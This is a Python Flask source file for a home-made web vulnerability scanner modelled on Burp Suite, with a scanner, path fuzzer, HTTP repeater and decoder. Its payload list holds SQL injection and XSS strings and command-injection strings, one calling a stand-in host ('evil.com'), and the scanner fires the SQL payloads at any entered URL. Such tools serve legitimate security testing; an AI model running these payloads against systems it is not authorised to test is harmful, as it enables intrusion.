#! /usr/bin/env python3
from flask import Flask, request, render_template_string, jsonify
import requests, time, re, base64, urllib.parse, urllib3
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings()
app = Flask(__name__)

# --- CONFIGURATION & PAYLOADS ---
WORDLIST = ["admin", "backup", "db", "config", "api/v1", ".git", ".env", "phpinfo"]
VULN_DB = {
    "SQLi": ["' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
    "XSS": ["<script>alert(1)</script>", "<svg onload=alert(1)>"],
    "RCE": ["; id", "| whoami", "`curl http://evil.com`"]
}

# --- ADVANCED NEON UI ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>NEON BURP ULTIMATE</title>
    <style>
        :root { --neon: #0ff; --pink: #f0f; --low: #39ff14; --bg: #050505; }
        body { font-family: 'Segoe UI', monospace; background: var(--bg); color: #fff; margin: 0; }
        .sidebar { width: 220px; position: fixed; height: 100%; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; }
        .main { margin-left: 260px; padding: 30px; }
        .nav-btn { 
            width: 100%; padding: 12px; margin: 8px 0; background: none; border: 1px solid #333; 
            color: #888; cursor: pointer; text-align: left; border-radius: 5px; transition: 0.3s;
        }
        .nav-btn.active { border-color: var(--neon); color: var(--neon); box-shadow: 0 0 10px var(--neon); }
        .box { background: #0f0f0f; border: 1px solid #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        input, textarea, select { 
            width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--low); 
            border-radius: 5px; margin: 10px 0;
        }
        .action-btn { 
            background: linear-gradient(45deg, var(--neon), var(--pink)); border: none; 
            padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px;
        }
        .v-high { color: #ff3131; text-shadow: 0 0 5px #ff3131; }
        .tab-content { display: none; }
        .active-tab { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        pre { background: #000; padding: 15px; border-radius: 5px; border: 1px solid #222; color: #adff2f; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2 style="color:var(--neon)">NEON BURP</h2>
        <button class="nav-btn active" onclick="showTab('scanner')">🛡️ Scanner</button>
        <button class="nav-btn" onclick="showTab('intruder')">💣 Intruder</button>
        <button class="nav-btn" onclick="showTab('repeater')">🔄 Repeater</button>
        <button class="nav-btn" onclick="showTab('decoder')">🔐 Decoder</button>
    </div>

    <div class="main">
        <div id="scanner" class="tab-content active-tab">
            <div class="box">
                <h3>Automated Vulnerability Scanner</h3>
                <input type="text" id="target_url" placeholder="https://example.com">
                <button class="action-btn" onclick="startScan()">START AUDIT</button>
            </div>
            <div id="scan_results"></div>
        </div>

        <div id="intruder" class="tab-content">
            <div class="box">
                <h3>Intruder (Fuzzer)</h3>
                <input type="text" id="fuzz_url" placeholder="https://example.com/FUZZ">
                <button class="action-btn" onclick="startFuzz()">LAUNCH BRUTEFORCE</button>
            </div>
            <pre id="fuzz_results">Waiting for action...</pre>
        </div>

        <div id="repeater" class="tab-content">
            <div class="box">
                <h3>HTTP Repeater</h3>
                <select id="rep_method"><option>GET</option><option>POST</option></select>
                <input type="text" id="rep_url" placeholder="Target URL">
                <textarea id="rep_body" placeholder="Body data..."></textarea>
                <button class="action-btn" onclick="sendRepeat()">SEND REQUEST</button>
            </div>
            <pre id="rep_response">Response will appear here...</pre>
        </div>

        <div id="decoder" class="tab-content">
            <div class="box">
                <h3>Smart Decoder</h3>
                <textarea id="decode_input" rows="5" placeholder="Paste Base64, URL encoded, or Hex here..."></textarea>
                <div style="display:flex; gap:10px;">
                    <button class="nav-btn" onclick="processData('b64d')">Base64 Decode</button>
                    <button class="nav-btn" onclick="processData('urld')">URL Decode</button>
                </div>
                <pre id="decode_output">Result...</pre>
            </div>
        </div>
    </div>

    <script>
        function showTab(id) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-tab'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(id).classList.add('active-tab');
            event.target.classList.add('active');
        }

        async function startScan() {
            const url = document.getElementById('target_url').value;
            const resDiv = document.getElementById('scan_results');
            resDiv.innerHTML = "<p>Scanning... Please wait.</p>";
            const response = await fetch('/api/scan', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url})
            });
            const data = await response.json();
            let html = `<div class='box'><h3>Audit for ${url}</h3>`;
            data.vulns.forEach(v => {
                html += `<p><b class='v-high'>[${v.risk}]</b> ${v.type}: ${v.detail}</p>`;
            });
            html += "</div>";
            resDiv.innerHTML = html;
        }

        async function startFuzz() {
            const url = document.getElementById('fuzz_url').value;
            const out = document.getElementById('fuzz_results');
            out.innerText = "Fuzzing paths...";
            const response = await fetch('/api/fuzz', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url})
            });
            const data = await response.json();
            out.innerText = JSON.stringify(data.results, null, 2);
        }

        async function processData(type) {
            const val = document.getElementById('decode_input').value;
            const out = document.getElementById('decode_output');
            if(type === 'b64d') out.innerText = atob(val);
            if(type === 'urld') out.innerText = decodeURIComponent(val);
        }

        async function sendRepeat() {
            const url = document.getElementById('rep_url').value;
            const method = document.getElementById('rep_method').value;
            const response = await fetch('/api/repeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: url, method: method})
            });
            const data = await response.json();
            document.getElementById('rep_response').innerText = data.body;
        }
    </script>
</body>
</html>
"""

# --- API ENDPOINTS ---

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/scan", methods=["POST"])
def api_scan():
    target = request.json.get("url")
    findings = []
    try:
        r = requests.get(target, timeout=5, verify=False)
        # Check Security Headers
        if "Content-Security-Policy" not in r.headers:
            findings.append({"type": "Lack of CSP", "risk": "Medium", "detail": "Web-app vulnerable to XSS injection"})
        
        # SQLi Test
        for p in VULN_DB["SQLi"]:
            res = requests.get(target, params={"id": p}, timeout=3)
            if any(err in res.text.lower() for err in ["sql", "mysql", "syntax"]):
                findings.append({"type": "SQL Injection", "risk": "Critical", "detail": f"Error-based SQLi found with {p}"})
                break
    except Exception as e:
        return jsonify({"error": str(e)})
    return jsonify({"vulns": findings})

@app.route("/api/fuzz", methods=["POST"])
def api_fuzz():
    base_url = request.json.get("url").replace("FUZZ", "")
    results = {}
    for word in WORDLIST:
        try:
            r = requests.get(urljoin(base_url, word), timeout=2, verify=False)
            results[word] = r.status_code
        except: continue
    return jsonify({"results": results})

@app.route("/api/repeat", methods=["POST"])
def api_repeat():
    url = request.json.get("url")
    method = request.json.get("method")
    try:
        r = requests.request(method, url, timeout=5, verify=False)
        return jsonify({"body": r.text})
    except Exception as e:
        return jsonify({"body": str(e)})

if __name__ == "__main__":
    print("🚀 NEON BURP ULTIMATE RUNNING ON http://127.0.0.1:5000")
    app.run(debug=True, port=5000)
